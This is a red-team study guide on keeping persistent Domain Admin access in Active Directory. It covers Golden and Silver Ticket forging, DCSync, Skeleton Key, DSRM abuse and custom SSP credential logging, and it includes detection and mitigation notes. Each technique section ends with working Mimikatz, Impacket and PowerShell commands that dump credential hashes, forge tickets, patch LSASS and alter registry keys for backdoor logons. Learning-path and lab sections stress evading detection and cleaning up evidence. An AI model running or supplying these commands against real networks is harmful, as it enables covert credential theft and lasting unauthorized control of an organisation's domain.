## Domain Persistence

This document covers techniques for maintaining long-term access to a compromised Active Directory environment. These methods allow attackers to retain Domain Admin level access even after initial compromise vectors are patched or credentials are changed.

---

## Core Concepts to Master

### 1. **Kerberos Authentication Architecture**
- **TGT (Ticket Granting Ticket):** User authentication ticket issued by KDC
- **TGS (Ticket Granting Service):** Service access ticket requested using TGT
- **krbtgt Account:** Special account that encrypts all TGTs domain-wide
- **Ticket Lifetime:** Default and maximum ticket validity periods
- **PAC (Privilege Attribute Certificate):** Authorization data embedded in tickets
- **Ticket Encryption:** RC4, AES128, AES256 encryption algorithms

### 2. **Active Directory Replication**
- **DRS Protocol:** Directory Replication Service used by DCs to sync data
- **Replication Permissions:** DS-Replication-Get-Changes rights
- **NTDS.dit Database:** AD database containing all domain objects and credentials
- **Replication Metadata:** Change tracking and versioning
- **SYSVOL Replication:** Group Policy and script replication
- **Replication Topology:** Site links and bridgehead servers

### 3. **Windows Authentication Mechanisms**
- **LSASS Process:** Local Security Authority Subsystem Service
- **SAM Database:** Security Accounts Manager (local accounts)
- **LSA Secrets:** Cached credentials and service account passwords
- **DPAPI (Data Protection API):** Credential encryption mechanism
- **SSP (Security Support Provider):** Authentication packages
- **Credential Guard:** Virtualization-based security for credentials

### 4. **Domain Controller Architecture**
- **DSRM (Directory Services Restore Mode):** Safe mode for DC maintenance
- **Local Administrator Account on DC:** Independent from domain accounts
- **Global Catalog Role:** Cross-domain query service
- **FSMO Roles:** Single-master operations (PDC, RID, Schema, etc.)
- **DC Machine Account:** Computer account for the DC itself
- **Netlogon Service:** Authentication communication protocol

### 5. **Persistence Survival Mechanisms**
- **Credential vs. Access Persistence:** Understanding the difference
- **Detection Evasion:** Blending with legitimate activity
- **Backup Access Methods:** Multiple persistence layers
- **Long-term vs. Short-term Persistence:** Trade-offs
- **Dormant Backdoors:** Inactive until triggered
- **Self-healing Persistence:** Automatic re-establishment

### 6. **Security Control Bypass**
- **LSA Protection (RunAsPPL):** Protected process light
- **Credential Guard:** VBS-based isolation
- **AppLocker/WDAC:** Application whitelisting
- **Antivirus/EDR Evasion:** Detection avoidance techniques
- **Log Manipulation:** Hiding traces
- **Audit Policy Understanding:** What gets logged

---

## Skills to Develop

### Technical Skills

#### 1. **Credential Extraction & Manipulation**
- **Mimikatz mastery:** All modules (sekurlsa, kerberos, lsadump, dpapi)
- **LSASS dumping:** Multiple techniques (ProcDump, comsvcs.dll, Task Manager)
- **Offline hash extraction:** From NTDS.dit and SAM files
- **Ticket export/import:** Saving and loading Kerberos tickets
- **Hash formats:** Understanding NTLM, LM, NTLMv2, Kerberos keys
- **Memory forensics:** Analyzing process memory for credentials

#### 2. **Kerberos Ticket Forging**
- **Golden Ticket creation:** Understanding all parameters and flags
- **Silver Ticket creation:** Service-specific ticket forging
- **Ticket lifetime manipulation:** Setting custom validity periods
- **Group membership injection:** Adding arbitrary SIDs to tickets
- **Inter-realm ticket forging:** Trust ticket creation
- **Ticket renewal and validation:** Understanding ticket lifecycle

#### 3. **Active Directory Database Manipulation**
- **DCSync operations:** Remote credential dumping via replication
- **NTDS.dit extraction:** Shadow copy and backup methods
- **Offline analysis:** Secretsdump.py, DSInternals PowerShell module
- **Permission granting:** Adding replication rights to accounts
- **Attribute modification:** Changing user/computer properties
- **Schema understanding:** AD object classes and attributes

#### 4. **Windows Registry Manipulation**
- **Remote registry access:** Connecting to and modifying remote registries
- **LSA registry keys:** Understanding security configuration
- **Service configuration:** Modifying service parameters
- **Persistence registry keys:** Run keys, services, drivers
- **Registry hive extraction:** Saving and analyzing offline
- **Registry monitoring:** Detecting and analyzing changes

#### 5. **Windows Service & DLL Management**
- **Service creation and modification:** Creating persistence services
- **DLL injection techniques:** Various injection methods
- **DLL search order hijacking:** Exploiting load paths
- **Service account permissions:** Understanding service contexts
- **SCM (Service Control Manager):** Service management API
- **DLL compilation:** Creating custom payloads

#### 6. **Stealth & Operational Security**
- **Event log manipulation:** Clearing and modifying logs
- **Timestamp manipulation:** Backdating files and events
- **Process hiding:** Concealing malicious processes
- **Network traffic obfuscation:** Encrypted C2 channels
- **Living-off-the-land:** Using native Windows tools
- **Indicator of Compromise (IOC) awareness:** Minimizing footprint

### Analytical Skills

#### 1. **Persistence Planning**
- Identifying optimal persistence locations
- Risk vs. reward analysis for each technique
- Understanding detection likelihood
- Selecting appropriate persistence methods
- Planning backup persistence mechanisms

#### 2. **Environment Assessment**
- Identifying security controls in place
- Understanding organizational processes
- Evaluating password rotation policies
- Assessing monitoring capabilities
- Finding gaps in defensive coverage

#### 3. **Threat Modeling**
- Understanding defender's perspective
- Anticipating incident response procedures
- Identifying likely detection points
- Planning for compromise recovery
- Evaluating long-term viability

#### 4. **Post-Compromise Strategy**
- Balancing persistence with stealth
- Prioritizing access maintenance
- Understanding acceptable risk levels
- Planning exit strategies
- Documenting access methods

### Operational Skills

#### 1. **Domain Controller Access**
- Various methods to access DCs remotely
- WinRM, RDP, SMB access techniques
- Scheduled task creation on DCs
- PowerShell remoting to DCs
- Understanding DC security hardening

#### 2. **Credential Management**
- Organizing harvested credentials
- Tracking credential validity
- Understanding credential lifecycles
- Password spray planning
- Credential rotation detection

#### 3. **Tool Proficiency**
- **Mimikatz:** Complete command reference
- **Rubeus:** Kerberos exploitation
- **Impacket suite:** secretsdump.py, getTGT.py, getST.py
- **PowerSploit:** Invoke-Mimikatz, PowerView
- **DSInternals:** PowerShell AD manipulation
- **Custom script development:** Automation and customization

#### 4. **Incident Response Awareness**
- Understanding detection mechanisms
- Recognizing investigation patterns
- Knowing common IR procedures
- Planning for detected scenarios
- Evidence cleanup techniques

---

## Learning Path Recommendations

### Beginner Level
1. Understand basic Windows authentication (NTLM, Kerberos)
2. Learn credential dumping from LSASS
3. Practice basic Mimikatz commands
4. Understand SAM and LSA Secrets
5. Learn about Golden and Silver Tickets

### Intermediate Level
1. Master DCSync attacks and replication abuse
2. Understand DSRM and local DC accounts
3. Learn registry-based persistence
4. Practice SSP/DLL injection techniques
5. Study detection methods and evasion
6. Understand Skeleton Key attacks

### Advanced Level
1. Develop custom persistence mechanisms
2. Master stealth and OPSEC techniques
3. Learn advanced Kerberos manipulation
4. Understand Credential Guard bypass
5. Practice in monitored environments
6. Combine multiple persistence layers

### Expert Level
1. Research novel persistence techniques
2. Develop automated persistence frameworks
3. Bypass advanced security controls
4. Contribute to offensive tools
5. Teach and mentor others
6. Write detailed documentation and research

---

## Recommended Lab Practice

### Lab Setup Requirements
- **Multi-DC environment:** At least 2 Domain Controllers
- **Security monitoring:** SIEM, EDR for detection practice
- **Varied OS versions:** Different Windows versions
- **Security controls:** Credential Guard, LSA Protection, AppLocker
- **Snapshot capability:** Quick rollback for testing

### Practice Scenarios

#### 1. **Golden Ticket Mastery**
- Extract krbtgt hash from DC
- Forge tickets with various lifetimes
- Test ticket with different group memberships
- Practice ticket injection methods
- Evade detection mechanisms

#### 2. **DCSync Operations**
- Grant replication permissions to low-priv account
- Remotely dump all domain credentials
- Selective credential extraction
- Evade Event ID 4662 detection
- Maintain replication-based backdoor

#### 3. **DSRM Abuse**
- Extract DSRM password from DC
- Modify registry for logon behavior
- Pass-the-hash with DSRM account
- Maintain access despite domain password changes
- Clean up registry modifications

#### 4. **Skeleton Key Deployment**
- Patch LSASS on DC successfully
- Test master password authentication
- Verify original passwords still work
- Handle LSA Protection bypass
- Remove skeleton key cleanly

#### 5. **Custom SSP Deployment**
- Register mimilib.dll on DC
- Verify credential logging
- Test persistence across reboots
- Review captured plaintext credentials
- Evade DLL loading detection

#### 6. **Layered Persistence**
- Implement 3+ different persistence methods
- Test survival after password resets
- Verify stealth of each method
- Practice restoration after detection
- Document complete access restoration procedure

---

## Detection & Blue Team Awareness

### Key Indicators of Compromise (IOCs)

#### Golden Ticket Detection
- Event ID 4769 (TGS Request) with unusual encryption types
- Tickets with abnormal lifetimes (>10 hours)
- Service tickets without prior TGT requests
- Tickets for disabled/deleted accounts
- Anomalous group memberships in tickets

#### DCSync Detection
- Event ID 4662 (Directory Service Access) with replication GUIDs
- Replication requests from non-DC computers
- Unusual accounts with DS-Replication rights
- Anomalous time of replication activity
- Failed replication attempts

#### DSRM Abuse Detection
- Registry modifications to DsrmAdminLogonBehaviour
- SAM hive access on Domain Controllers
- Local administrator logons on DCs
- Event ID 4794 (DSRM password change attempts)

#### Skeleton Key Detection
- Event ID 7045 (Service installed - mimikatz driver)
- LSASS process memory anomalies
- Failed authentication with "mimikatz" password
- Event ID 4673 (Sensitive privilege use)

#### SSP Detection
- Registry changes to Security Packages
- Unusual DLLs loaded by LSASS (Sysmon Event ID 7)
- kiwissp.log file creation
- LSASS loading unsigned DLLs

### Defensive Recommendations
- **krbtgt rotation:** Rotate twice annually minimum
- **Replication monitoring:** Alert on non-DC replication
- **LSA Protection:** Enable RunAsPPL on DCs
- **Credential Guard:** Deploy on sensitive systems
- **Tiered Administration:** Separate admin account levels
- **Audit policies:** Enable advanced auditing
- **SIEM correlation:** Cross-reference multiple event types

---

### Golden Ticket Attack

**What is a Golden Ticket?** 
A forged Kerberos TGT (Ticket Granting Ticket) created using the krbtgt account's password hash. Since the krbtgt account encrypts all TGTs, possessing its hash allows you to create valid tickets for any user with any privileges, bypassing normal authentication.

**How it works:**
1. Compromise a Domain Controller and extract the krbtgt account hash
2. Forge a TGT for any user (usually Administrator) with any group memberships
3. Set custom lifetimes (can be valid for years)
4. Inject the ticket into memory or save for later use
5. Access any resource in the domain as the forged user

**Why it's powerful:**
- Works even if the user account is disabled or deleted
- Valid until krbtgt password is changed (rarely done)
- Bypasses most authentication logs
- No need to authenticate against DC after ticket creation
- Can specify group memberships that don't exist

**Requirements:** 
- Domain Admin access (to extract krbtgt hash from DC)
- Domain SID
- krbtgt NTLM hash

**Detection:** 
- Unusual ticket lifetimes
- Tickets for disabled/non-existent accounts
- Tickets with abnormal group memberships
- Monitor krbtgt hash changes

**Mitigation:** Rotate krbtgt password twice (need two rotations to invalidate all tickets)

```powershell
#Execute mimikatz on DC as DA to grab krbtgt hash:
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <DC'sName>

#On any machine:
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DomainName> /sid:<Domain's SID> /krbtgt:
<HashOfkrbtgtAccount>   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

### DCsync Attack

**What is DCSync?** 
A technique that abuses the Directory Replication Service (DRS) protocol to impersonate a Domain Controller and request password hashes for any user from a real DC. Instead of accessing the DC directly to dump credentials, you remotely request replication data.

**How it works:**
1. Attacker has/grants themselves replication permissions:
   - DS-Replication-Get-Changes (Replicating Directory Changes)
   - DS-Replication-Get-Changes-All (Replicating Directory Changes All)
2. Uses DRS protocol to request user credential data
3. DC thinks it's replicating to another DC
4. Receives password hashes (NTLM, Kerberos keys) for requested accounts
5. No need to touch LSASS or NTDS.dit directly

**Why use DCSync for persistence:**
- Can dump all domain credentials remotely
- Stealthier than accessing DC filesystem
- Can re-extract credentials anytime
- Can be granted as ACL permissions (backdoor)
- Works from any domain-joined machine

**Requirements:** 
- Domain Admin (to run immediately)
- OR DS-Replication permissions (can be granted as persistence)

**Detection:** 
- Monitor Event ID 4662 (Directory Service Access)
- Look for replication requests from non-DC computers
- Unusual accounts with replication permissions

**Persistence method:** Grant a compromised low-privilege user DCSync rights as a backdoor

```powershell
#DCsync using mimikatz (You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges):
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DomainName>\<AnyDomainUser>"'

#DCsync using secretsdump.py from impacket with NTLM authentication
secretsdump.py <Domain>/<Username>:<Password>@<DC'S IP or FQDN> -just-dc-ntlm

#DCsync using secretsdump.py from impacket with Kerberos Authentication
secretsdump.py -no-pass -k <Domain>/<Username>@<DC'S IP or FQDN> -just-dc-ntlm
```

**Tip:** 
 /ptt -> inject ticket on current running session 
 /ticket -> save the ticket on the system for later use

### Silver Ticket Attack

**What is a Silver Ticket?** 
A forged Kerberos TGS (Ticket Granting Service) ticket for a specific service, created using that service account's password hash. Unlike Golden Tickets (which use krbtgt), Silver Tickets target individual services (CIFS, HTTP, MSSQL, etc.).

**How it works:**
1. Obtain the password hash of a service account or computer account
2. Forge a TGS ticket for that specific service
3. Specify any user to impersonate (usually a privileged user)
4. Inject the ticket and access the service
5. No communication with DC needed after ticket creation

**Differences from Golden Ticket:**
- **Scope:** Only works for one service on one machine (not domain-wide)
- **Hash needed:** Service account hash (easier to obtain) vs. krbtgt hash
- **Stealth:** More stealthy (doesn't touch KDC/DC after creation)
- **Detection:** Harder to detect (no DC authentication events)
- **Limitations:** Can't request additional tickets from DC

**Common target services:**
- CIFS (file sharing): Access C$, ADMIN$ shares
- HOST: WMI, PowerShell Remoting, Scheduled Tasks
- HTTP: Web applications
- MSSQL: Database access
- LDAP: Directory queries
- WSMAN: PowerShell Remoting

**Requirements:** 
- Service account or computer account NTLM hash
- Domain SID
- Target machine/service information

**Use cases:**
- Persistence on specific high-value servers
- Stealth access without DC interaction
- When you can't get krbtgt but have service account hashes

**Detection:** 
- Service tickets without corresponding TGT requests
- Tickets for unusual services
- Lifetime anomalies

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:<DomainName> /sid:<DomainSID> /target:<TheTargetMachine> /service:
<ServiceType> /rc4:<TheSPN's Account NTLM Hash> /user:<UserToImpersonate> /ptt"'
```

[SPN List](https://adsecurity.org/?page_id=183)

### Skeleton Key Attack

**What is a Skeleton Key?** 
A malicious patch applied to the LSASS process on a Domain Controller that allows authentication with a single "master password" (default: "mimikatz") for any user account, while normal passwords continue to work. It's a backdoor that doesn't require changing any account passwords.

**How it works:**
1. Inject the skeleton key patch into DC's LSASS process
2. The patch intercepts authentication requests
3. If the password "mimikatz" (or custom password) is provided, authentication succeeds
4. Original user passwords still work normally
5. All domain users can now be authenticated with the skeleton key password
6. Works for any authentication (RDP, SMB, LDAP, etc.)

**Characteristics:**
- **In-memory only:** Disappears on DC reboot (not persistent across reboots)
- **Dual password:** Both real password and skeleton key work
- **Domain-wide:** Affects all user accounts
- **No password changes:** Doesn't modify AD database
- **Requires DA:** Need Domain Admin to patch LSASS on DC

**Requirements:** 
- Domain Admin privileges
- Access to Domain Controller

**Limitations:**
- Removed on DC reboot
- Blocked by LSA Protection (RunAsPPL)
- Requires re-application after DC restart
- Can be detected by memory scanning

**Detection:** 
- Event ID 7045 (suspicious service installation)
- Event ID 4673 (sensitive privilege use)
- LSASS process memory anomalies
- Failed authentication attempts with "mimikatz" password
- Monitor mimikatz execution on DCs

**Use case:** Quick backdoor for red team exercises, not ideal for long-term persistence due to reboot limitation

```powershell
#Exploitation Command runned as DA:
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DC's FQDN>

#Access using the password "mimikatz"
Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
```

### DSRM Abuse

**What is DSRM (Directory Services Restore Mode)?** 
A safe mode boot option for Domain Controllers with a local administrator account used for AD maintenance/recovery. This account has a password set during DC promotion (called SafeModePassword). By default, this account can only be used when booting into DSRM, but we can change this behavior.

**How the attack works:**
1. Dump the DSRM account hash from the DC's local SAM
2. This is a LOCAL account (not domain), so it's not affected by domain password changes
3. Modify registry to allow DSRM account to logon normally (not just in DSRM boot)
4. Use Pass-the-Hash with DSRM credentials to get local admin on DC
5. Persist even if domain passwords are rotated

**Why this is valuable:**
- **Persistence:** DSRM password is rarely changed (often never after DC setup)
- **Independent:** Not tied to domain accounts (survives domain password resets)
- **Local admin on DC:** Full control of Domain Controller
- **Stealthy:** Not a domain account, often overlooked

**Registry modification purpose:**
- **DsrmAdminLogonBehaviour = 0:** DSRM account can only logon in DSRM mode (default)
- **DsrmAdminLogonBehaviour = 1:** DSRM account can logon if AD fails
- **DsrmAdminLogonBehaviour = 2:** DSRM account can always logon (what we set)

**Requirements:** 
- Domain Admin privileges (to access DC and dump SAM)
- Access to a Domain Controller

**Detection:** 
- Monitor registry changes to HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehaviour
- Event ID 4794 (DSRM administrator password change attempts)
- Logons with local administrator account on DC
- SAM hive access on DC

**Mitigation:** 
- Regularly change DSRM password
- Monitor registry key changes
- Alert on local administrator logons to DCs

_WUT IS DIS?: Every DC has a local Administrator account, this accounts has the DSRM password which is a SafeBackupPassword. We can get this and then pth its NTLM hash to get local Administrator access to DC!_

```powershell
#Dump DSRM password (needs DA privs):
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName <DC's Name>

#This is a local account, so we can PTH and authenticate!
#BUT we need to alter the behaviour of the DSRM account before pth:
#Connect on DC:
Enter-PSSession -ComputerName <DC's Name>

#Alter the Logon behaviour on registry:
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD -Verbose

#If the property already exists:
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -Verbose
```

Then just PTH to get local admin access on DC!

### Custom SSP (Security Support Provider)

**What is a Custom SSP?** 
Security Support Providers (SSPs) are DLLs that handle authentication in Windows. By registering a malicious SSP (like mimilib.dll from Mimikatz), you can intercept and log plaintext credentials every time a user authenticates to the system.

**How it works:**
1. SSPs are authentication packages loaded by LSASS at boot
2. Register a custom SSP DLL (mimilib.dll) in the registry
3. The DLL hooks into the authentication process
4. Every time a user logs in, the SSP captures plaintext username and password
5. Credentials are logged to a file (C:\Windows\System32\kiwissp.log)
6. Survives reboots (registry-based persistence)

**Two deployment methods:**
1. **Registry method:** Persistent across reboots, requires registry modification
2. **Memory injection (misc::memssp):** Active immediately but lost on reboot

**What gets logged:**
- Domain username
- Plaintext password
- Timestamp of authentication
- Authentication type

**Why this is powerful:**
- **Plaintext passwords:** No need to crack hashes
- **Passive collection:** Just wait for users to authenticate
- **Persistent:** Registry method survives reboots
- **High-value targets:** DCs see authentication from all users
- **Low noise:** Normal authentication process, hard to detect

**Requirements:** 
- Local administrator or SYSTEM on target machine
- Best deployed on Domain Controllers (all user authentications)
- mimilib.dll file

**Detection:** 
- Monitor Security Packages registry key (HKLM\System\CurrentControlSet\Control\Lsa\Security Packages)
- Unusual DLLs loaded by LSASS
- File monitoring for kiwissp.log
- Sysmon Event ID 7 (DLL loaded by LSASS)
- LSA Protection blocks this

**Mitigation:** 
- Enable LSA Protection (RunAsPPL)
- Monitor registry changes
- Use Credential Guard
- Whitelist approved SSPs

_WUT IS DIS?: We can set our on SSP by dropping a custom dll, for example mimilib.dll from mimikatz, that will monitor and capture plaintext passwords from users that logged on!_

From powershell:

```powershell
#Get current Security Package:
$packages = Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' | select -ExpandProperty  'Security Packages'

#Append mimilib:
$packages += "mimilib"

#Change the new packages name
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' -Value $packages
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name 'Security Packages' -Value $packages

#ALTERNATIVE (in-memory, not persistent across reboots):
Invoke-Mimikatz -Command '"misc::memssp"'
```

Now all logons on the DC are logged to -> C:\Windows\System32\kiwissp.log